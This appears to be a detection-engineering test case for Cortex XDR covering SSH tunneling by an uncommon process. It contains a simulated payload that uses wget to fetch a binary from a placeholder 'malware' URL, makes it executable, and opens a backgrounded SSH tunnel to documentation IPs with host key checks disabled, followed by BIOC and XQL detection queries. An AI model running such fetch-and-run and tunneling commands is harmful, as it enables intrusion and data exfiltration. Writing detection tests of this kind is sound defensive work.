identity.name: SSH Tunneling to Cloud Resource via Rare Process
identity.summary: An attacker uses a rare process to establish an SSH tunnel to an uncommon cloud resource, potentially exfiltrating data or creating a backdoor. Cortex should detect the unusual process spawning SSH an
identity.description: An attacker uses a rare process to establish an SSH tunnel to an uncommon cloud resource, potentially exfiltrating data or creating a backdoor. Cortex should detect the unusual process spawning SSH and connecting to a cloud IP.

techniques.name: Command and Scripting Interpreter: Unix Shell

payload.code:
mkdir -p /tmp/ssh-tunnel
wget -O /tmp/ssh-tunnel/ssh_client https://example.com/malware
chmod +x /tmp/ssh-tunnel/ssh_client
/tmp/ssh-tunnel/ssh_client -o StrictHostKeyChecking=no -f -N -L 8080:192.0.2.1:22 user@192.0.2.100

expected_artifacts.description: SSH client process started with unusual parameters
Outbound SSH connection to cloud resource

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rare Process SSH to Cloud Resource
biocs.description: Detection of a rare or unknown process initiating an SSH session to a cloud IP address
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name not in ('/usr/bin/ssh', '/usr/bin/sftp', '/usr/bin/scp')
| filter action_remote_ip in ('192.0.2.100', '192.0.2.1')

abiocs.name: Unusual SSH Process to Cloud IP
abiocs.description: Behavioral deviation where a process not typically used for SSH connects to a cloud IP address
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_process_image_name not in ('/usr/bin/ssh', '/usr/bin/sftp', '/usr/bin/scp')
| filter action_remote_ip in ('192.0.2.100', '192.0.2.1')
| filter network_protocol = 'TCP' and dst_port = 22

xql_queries.name: SSH Tunneling to Cloud IPs
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip in ('192.0.2.100', '192.0.2.1')
| filter network_protocol = 'TCP' and dst_port = 22
| filter action_process_image_name not in ('/usr/bin/ssh', '/usr/bin/scp')
| comp count() by action_process_image_name, action_remote_ip
